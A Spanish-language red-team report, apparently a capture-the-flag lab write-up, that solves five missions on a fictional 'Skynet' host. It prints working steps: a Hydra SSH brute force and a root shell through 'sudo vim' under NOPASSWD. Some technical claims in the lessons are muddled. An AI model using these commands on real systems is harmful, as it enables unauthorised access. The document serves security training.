# RED TEAM :: After Action Report — CYBERQUEST "Skynet :: Nodo 07"

> Documento de entrega del equipo de ataque. Narra la resolución íntegra de
> las 5 misiones con las herramientas usadas (framework MITRE ATT&CK).

---

## Resumen ejecutivo

El nodo `intranet.skynet.local` (10.10.10.7) expone un servicio web en el
puerto 80 y SSH en el 22. Se obtuvo acceso inicial con credenciales
débilmente protegidas (ingeniería social en la propia intranet), se
recuperaron 3 banderas por vía remota (estego, web y crypto), se accedió por
SSH al usuario `dyson_m`, se escaló a root mediante un binario sudo
configurado como `NOPASSWD` y se validó el núcleo con `nucleo.sh`.

Objetivo: **17/19 pasos completados · acceso root · ADN reconstruido ·
ORDEN ejecutada.**

---

## 1. Reconocimiento (fase pasiva y activa)

- `nmap -sV -sC 10.10.10.7`
  - `80/tcp` HTTP — servidor Python SimpleHTTP (intranet)
  - `22/tcp` OpenSSH — banner "SKYNET INTRA NET NODO 07"
- Descubrimiento de contenido: `gobuster dir -u http://10.10.10.7 -w dir.txt`
  - `/robots.txt`, `/personal.html`, `/archivo/`, `/nucleo/`, `/admin/`,
    `/estilo.css`

**Hallazgo:** `robots.txt` desvela el catálogo y una bandera (F2) en un
comentario:

```
Fragmento_2=NucleoRojo{RU5DSUEgVEk}
```

→ **F2: `NucleoRojo{RU5DSUEgVEk}`** · 200 p.

## 2. Ingeniería social / OSINT (preparación de credenciales)

`/personal.html` describe al jefe de laboratorio **Miles Dyson** y repite el
vocabulario corporativo. Extracción de corpus:

```bash
cewl http://10.10.10.7 -m 5 -w palabras.txt
```

`/admin/` (comentario HTML) revela: usuario `dyson_m` y el hecho de que la
clave SSH "nunca cambió desde el proyecto CYBERDYNE". Ataque de diccionario:

```bash
hydra -l dyson_m -P palabras.txt ssh://10.10.10.7
```
→ `dyson_m:Cyberdyne`. Puerta de servicio **SSH (T1110 - Brute Force)**.

*(Retorno al uso de credenciales tras comprometer la ofuscación en 4.3.)*

## 3. Esteganografía DCT (M1) y ZIP cifrado (parte de M4)

Del index: "toda transferencia queda registrada en /archivo/pcap". En el
pcap (`red_skynet.pcap`, tramas 4 y 6) se observa el GET del
`captura_terminador.jpg` y el `bandera_nodo.zip`.

La imagen tiene un payload en los coeficientes AC (JSteg/DCT-LSB). Se
extrae con `tools/resistance_steg.py` (stdlib puro):

```
PISTA_1 :: TRANSMISION INTERCEPTADA...
PREGUNTA: ¿Cual es el nombre de la persona que esta al lado del terminator?
```

**Respuesta** (lectura de la imagen + lore): `John Connor`. Observando el
EXIF de la imagen se captura además la **F1**:

- **F1: `NucleoRojo{TEEgUkVTSVNU}`** · 300 p.

Con `John Connor` como contraseña se abre el ARCA (T1110 - password
esperada por el lore):

```bash
unzip bandera_nodo.zip   # password: John Connor
```
- `bandera.jpg` (? EXIF) →
  **F4: `NucleoRojo{UyBST1NUUk9T}`** · 300 p.
- `pista4.txt` → confirma el vector de elevación (`sudo -l`, `vim`).

## 4. Criptografía híbrida (M3)

`/nucleo/` publica: `nucleo.conf` (e, n), `nucleo.conf.enc` (cifrado RSA),
`ruido.enc` (AES-256-CBC OpenSSL `-pbkdf2`).

1. **RSA 512** — se obtiene la llave privada desde las credenciales SSH:
   `~/nucleo/llave_privada.txt` (p, q, e). Con `rsa_tool.py`
   (Euclides extendido + exponenciación modular):

   ```bash
   python3 rsa_tool.py llave_privada.txt nucleo.conf nucleo.conf.enc
   # -> S3kiRa-07   (clave de sesión)
   ```

   *(En un entorno real habríamos factorizado n con algoritmo de
   quadratura/ECM; aquí la llave privada quedó expuesta en el home.)*

2. **AES-256-CBC** — descifrado del "ruido" (T1486 asociado, modo enc -d):

   ```bash
   openssl enc -d -aes-256-cbc -pbkdf2 -k 'S3kiRa-07' -in ruido.enc -out orden.txt
   ```
   → en `orden.txt`: FRAGMENTO_3 y una *cadena* base64.

3. **Doble base64 (CyberChef `From Base64` ×2)**:
   ```
   Uld3Z1lYUmhjWFZsSUdWeklHRWdiR0Z6SURRNk1EQT0= -> El ataque es a las 4:00
   ```
   → **ORDEN: `El ataque es a las 4:00`**.

4. **F3**: `FRAGMENTO_3=NucleoRojo{RU5FIE1VQ0hP}` → **F3: `NucleoRojo{RU5FIE1VQ0hP}`** · 200 p.
5. **Bonus ROT13** (CESAR): `ry nepba...` → "el arcon de la resistencia se
   abre con john connor" (refuerzo del patrón de contraseñas del tipo).
   **Bonus +300 p.**

## 5. Escalada de privilegios (M5)

Con `dyson_m`:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim, /usr/bin/vi
sudo vim -c ':!/bin/bash'
```
Gtfobins → shell root (**T1548 - Abuso de Sudo**). En `/root/nucleo/`:

- `FLAG5.txt` → **F5: `NucleoRojo{XzAxMTA}`** · 300 p.
- `nucleo.sh` validador.

## 6. Validación final del núcleo

```bash
sudo /root/nucleo/nucleo.sh
```
Con los 5 fragmentos en orden + la ORDEN:

```
 >>> NUCLEO VERIFICADO CON EXITO <<<
 ADN  : LA RESISTENCIA TIENE MUCHOS ROSTROS_0110
 ORDEN: El ataque es a las 4:00
```

---

## Tabla de puntaje

| Ítem | Puntos |
|---|---|
| F1 estego | 300 |
| F2 robots.txt | 200 |
| F3 crypto | 200 |
| F4 zip/EXIF | 300 |
| F5 escalada | 300 |
| ORDEN ejecutada | 200 |
| Bonus ROT13 | 300 |
| Pistas capturadas (pista1, pista2, pista4) | 300 |
| Acceso SSH documentado | 200 |
| **Subtotal misiones** | **2300** |
| Este informe After Action | 1000 |
| **Total** | **3300** |

## Lecciones técnicas

1. Credenciales "seguras por oscuridad" fallan ante CeWL→Hydra + un
   comentario HTML (OSINT de bajo coste).
2. La llave privada RSA **nunca debe** residir en un home accesible.
3. El sal puede derivarse para repetición: usar `-pbkdf2` + salt aleatorio
   por fichero y eliminar material cifrado de carpetas web.
4. `NOPASSWD` en binarios con escape a shell (`vim`, `vi`) = root garantizado.
5. La esteganografía DCT preserva los bytes de cuantización; herramientas
   gratuitas de inspección de metadatos (exiftool) la detectan con
   `-a -x ResolutionUnit`.